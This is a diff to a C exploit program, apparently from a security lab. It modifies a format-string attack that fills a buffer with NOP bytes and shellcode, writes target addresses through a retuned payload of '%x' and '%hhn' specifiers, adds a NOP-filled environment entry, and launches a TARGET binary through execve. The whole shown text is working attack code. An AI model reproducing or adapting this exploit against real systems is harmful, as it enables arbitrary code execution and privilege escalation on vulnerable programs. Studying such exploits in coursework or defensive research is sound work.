@@ -11,9 +11,10 @@ int
 main ( int argc, char * argv[] )
 {
 	char *	args[3];
-	char *	env[21];
+	char *	env[22];
 	char attackBuffer[BUFSIZE];
-	
+	char blank[200];
+	memset(blank, 0x90, 200);
 	int i = 0;
 	for (i = 0; i < BUFSIZE; i++){
 		attackBuffer[i] = 0x90;
@@ -21,7 +22,7 @@ main ( int argc, char * argv[] )
 	for (i = 0; i < SHELLSIZE; i++){
 		attackBuffer[i] = shellcode[i];
 	}
-	char tmp [] = "%x%x%x%x%12x|%hhn|%86x|%hhn|%166x|%hhn|";
+	char tmp [] = "|%08x|%08x|%08x|%08x|%10x|%hhn|%152x|%hhn|%168x|%hhn|%154x|%hhn";
 	memcpy(&attackBuffer[SHELLSIZE + 4 - SHELLSIZE%4], tmp, strlen(tmp));
 	attackBuffer[SHELLSIZE + 4 - SHELLSIZE%4 + strlen(tmp)] = '\0';
 	args[0] = TARGET;
@@ -57,7 +58,8 @@ main ( int argc, char * argv[] )
 
 	env[19] = attackBuffer;
 
-	env[20] = NULL;
+	env[20] = blank;
+	env[21] = NULL;
 
 	if ( execve (TARGET, args, env) < 0 )
 		fprintf (stderr, "execve failed.\n");
